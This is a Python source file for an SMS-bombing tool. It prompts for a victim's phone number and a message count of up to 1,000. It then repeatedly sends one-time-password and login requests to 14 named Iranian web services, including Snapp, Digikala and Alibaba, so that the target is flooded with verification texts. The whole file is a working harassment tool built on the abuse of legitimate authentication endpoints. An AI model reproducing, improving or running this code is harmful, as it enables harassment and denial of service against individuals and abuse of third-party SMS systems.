import requests
import json
import time

from libs.utils import console

try:

    while True:
        console.clear()
        console.welcome()
        console.menu()
        userSelectItem = input(console.status("+")+"Choose an option (1/2/3/..) : ")
        
        if userSelectItem == "1":
            targetNumber = input(console.status("+","Enter phone number (914xxxxxxx) : "))

            if targetNumber == "": 
                print(console.status("-","The number cannot be empty "))
                input(console.status("+")+"Press enter to refresh the page ")
            else : 
                smsRepetition = input(console.status("+","Number of messages (max = 1,000) : "))

                if smsRepetition == "":
                    print(console.status("*","The empty value is equal to 20 messages"))
                    smsRepetition = 20
                elif int(smsRepetition) > 1000:
                    print(console.status("*","The maximum capacity is 1,000 messages"))
                    smsRepetition = 1000
                else:
                    smsRepetition = int(smsRepetition)
        
                print("\n"+console.status("#")+"Starting to send SMS bombs ...")

                messageIndex = 0
                apiServices = {
                    "1":{"name":"snapp","url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp","data": {"cellphone":"+98"+targetNumber}},
                    "2":{"name":"basalam","url": "https://auth.basalam.com/otp-request","data": {"mobile":"0"+targetNumber,"client_id":11}},
                    "3":{"name":"alibaba","url": "https://ws.alibaba.ir/api/v3/account/mobile/otp","data": {"phoneNumber":targetNumber}},
                    "4":{"name":"gapfilm","url": "https://core.gapfilm.ir/api/v3.1/Account/Login","data": {"Type":3,"Username":targetNumber,"SourceChannel":"GF_WebSite","SourcePlatform":"desktop","SourcePlatformAgentType":"Firefox","SourcePlatformVersion":"107.0","GiftCode":""}},
                    "5":{"name":"snapp market","url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+targetNumber,"data": {}},
                    "6":{"name":"tebinja","url": "https://www.tebinja.com/api/v1/users","data": {"username":"0"+targetNumber}},
                    "7":{"name":"zarinplus","url": "https://api.zarinplus.com/user/zarinpal-login","data": {"phone_number":"98"+targetNumber,"source":"zarinplus"}},
                    "8":{"name":"snapp express","url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=da9a878a&optionalVersion=5.6.6&UDID=437b9076-0c60-49cc-89f9-7fcb2d47fa10","data": {"cellphone":"0"+targetNumber,"captcha":"","local":""}},
                    "9":{"name":"snapp market","url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0"+targetNumber+"&platform=PWA","data": {}},
                    "10":{"name":"drdr","url": "https://drdr.ir/api/registerEnrollment/sendDisposableCode","data": {"phoneNumber":targetNumber,"userType":"PATIENT"}},
                    "11":{"name":"snapp food","url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=dc095b05-202c-4a71-9e9b-9127688fc54e&locale=fa","data": {"cellphone":"0"+targetNumber}},
                    "12":{"name":"snapp doctor","url": "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/"+targetNumber+"/sms?cCode=+98","data": {}},
                    "13":{"name":"snapp room","url": "https://napi.snapproom.com/users/self/verification-flow","data": {"username":"0"+targetNumber}},
                    "14":{"name":"digikala","url": "https://api.digikala.com/v1/user/authenticate/","data": {"backUrl":"/","username":"0"+targetNumber,"otp_call":False}},
                    ## "call":{"name":"komodaa","url": "https://api.komodaa.com/api/v2.6/loginRC/request","data": {"phone_number":"0"+targetNumber}},
                }

                while (smsRepetition > messageIndex):
                        for apiIndex in apiServices:
                            if (messageIndex >= smsRepetition): break
                            apiName = apiServices[apiIndex]["name"]
                            apiUrl = apiServices[apiIndex]["url"]
                            apiData = apiServices[apiIndex]["data"]
                            sendMessage = requests.post(apiUrl,data=apiData)
                            print(console.status("#")+"Send SMS +1 ("+str(messageIndex+1)+"/"+str(smsRepetition)+") ("+apiName+") "+console.header+sendMessage.reason+console.endc)
                            if (sendMessage.reason == "OK"): messageIndex+=1
                            time.sleep(2)
                else :
                    console.love()
                    print("\n"+console.status("#")+"Messages sent successfully (:")
                    input(console.status("@","Press enter to refresh the page "))

        elif userSelectItem == "2":
            print(console.status("*","The desired service is not active"))
            input(console.status("+","Press enter to refresh the page "))
        
        elif userSelectItem == "3":
            print(console.status("*","The desired service is not active"))
            input(console.status("+","Press enter to refresh the page "))
        
        else :
            print(console.status("-","The desired option does not exist"))
            input(console.status("+","Press enter to refresh the page "))

except:
    print("\n"+console.status("-","You Exit Tools !!"))

